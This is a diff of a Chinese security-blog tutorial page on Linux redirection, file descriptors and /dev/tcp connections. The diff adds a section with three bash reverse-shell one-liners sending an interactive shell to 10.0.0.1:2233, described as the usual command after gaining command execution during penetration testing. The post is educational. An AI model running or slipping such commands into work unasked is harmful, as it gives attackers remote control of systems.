@@ -86,7 +86,7 @@
 <meta property="og:url" content="/2017-12-24-Linux-redirection/index.html">
 <meta property="og:site_name" content="Security blog">
 <meta property="og:description" content="还没搞懂command &amp;gt;file 2&amp;gt;&amp;amp;1？怎么回事">
-<meta property="og:updated_time" content="2017-12-24T07:33:43.322Z">
+<meta property="og:updated_time" content="2017-12-25T03:00:01.938Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux重定向">
 <meta name="twitter:description" content="还没搞懂command &amp;gt;file 2&amp;gt;&amp;amp;1？怎么回事">
@@ -357,7 +357,7 @@
 <p>为什么标准输出、输入、错误的输出都呈现在终端呢？在你启动<em>bash</em>的时候，它会同时打开三个标准的文件描述符0、1、2，并且它们都是指向<em>/dev/tty0</em>。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0 -----------&gt;  /dev/tty0</div><div class="line">1 -----------&gt;  /dev/tty0</div><div class="line">2 -----------&gt;  /dev/tty0</div></pre></td></tr></table></figure></p>
 <h4 id="新建文件描述符"><a href="#新建文件描述符" class="headerlink" title="新建文件描述符"></a>新建文件描述符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">exec 3&gt;file</div><div class="line">ls &gt;&amp;3</div><div class="line">exec 3&lt;file</div><div class="line">cat &lt;&amp;3</div><div class="line">exec 3&lt;&gt;file</div></pre></td></tr></table></figure>
 <h4 id="删除文件描述符"><a href="#删除文件描述符" class="headerlink" title="删除文件描述符"></a>删除文件描述符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec 3&gt;&amp;-</div></pre></td></tr></table></figure>
-<h3 id="重定向标准输出和错误"><a href="#重定向标准输出和错误" class="headerlink" title="重定向标准输出和错误"></a>重定向标准输出和错误</h3><p><strong>缩写模式</strong></p>
+<h3 id="重定向标准输出和错误"><a href="#重定向标准输出和错误" class="headerlink" title="重定向标准输出和错误"></a>重定向标准输出和错误</h3><p><strong>特殊的缩写模式</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">command &amp;&gt; file</div></pre></td></tr></table></figure>
 <p><em>&amp;&gt;</em>是<em>bash</em>的重定向标准输出和错误的<em>shortcut</em></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">command &gt;&amp; file</div></pre></td></tr></table></figure>
@@ -379,6 +379,11 @@
 <h3 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo 3&lt;&gt;/dev/tcp/www.google.com/80</div><div class="line">echo -e &quot;GET / HTTP/1.1\n\n&quot; &gt;&amp;3</div><div class="line">cat &lt;&amp;3</div></pre></td></tr></table></figure>
 <p><em>/dev/tcp/host/port</em>是个特殊文件，简单说就是用来通过<em>bash</em>建立<em>tcp</em>链接的。当然也可以使用<em>UDP</em></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo 3&lt;&gt;/dev/udp/www.google.com/80</div><div class="line">echo -e "GET / HTTP/1.1\n\n" &gt;&amp;3</div><div class="line">cat &lt;&amp;3</div></pre></td></tr></table></figure>
+<h3 id="彩蛋？反弹shell"><a href="#彩蛋？反弹shell" class="headerlink" title="彩蛋？反弹shell"></a>彩蛋？反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/2233 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p>在渗透过程中能够执行命令了，那么为了反弹shell一般都会执行上述这条命令。如果你理解以上内容，那么这部分也能搞定了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &amp;&gt; /dev/tcp/10.0.0.1/2233 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p>再比如下面这种写法也是可以的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;/dev/tcp/10.0.0.1/2233 2&gt;&amp;1 0&gt;&amp;1</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -578,7 +583,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#标准输出、输入、错误"><span class="nav-number">1.</span> <span class="nav-text">标准输出、输入、错误</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件描述符"><span class="nav-number">2.</span> <span class="nav-text">文件描述符</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#新建文件描述符"><span class="nav-number">2.1.</span> <span class="nav-text">新建文件描述符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#删除文件描述符"><span class="nav-number">2.2.</span> <span class="nav-text">删除文件描述符</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#重定向标准输出和错误"><span class="nav-number">3.</span> <span class="nav-text">重定向标准输出和错误</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊重定向"><span class="nav-number">4.</span> <span class="nav-text">特殊重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#访问网站"><span class="nav-number">5.</span> <span class="nav-text">访问网站</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#标准输出、输入、错误"><span class="nav-number">1.</span> <span class="nav-text">标准输出、输入、错误</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件描述符"><span class="nav-number">2.</span> <span class="nav-text">文件描述符</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#新建文件描述符"><span class="nav-number">2.1.</span> <span class="nav-text">新建文件描述符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#删除文件描述符"><span class="nav-number">2.2.</span> <span class="nav-text">删除文件描述符</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#重定向标准输出和错误"><span class="nav-number">3.</span> <span class="nav-text">重定向标准输出和错误</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊重定向"><span class="nav-number">4.</span> <span class="nav-text">特殊重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#访问网站"><span class="nav-number">5.</span> <span class="nav-text">访问网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#彩蛋？反弹shell"><span class="nav-number">6.</span> <span class="nav-text">彩蛋？反弹shell</span></a></li></ol></div>
             
 
           </div>
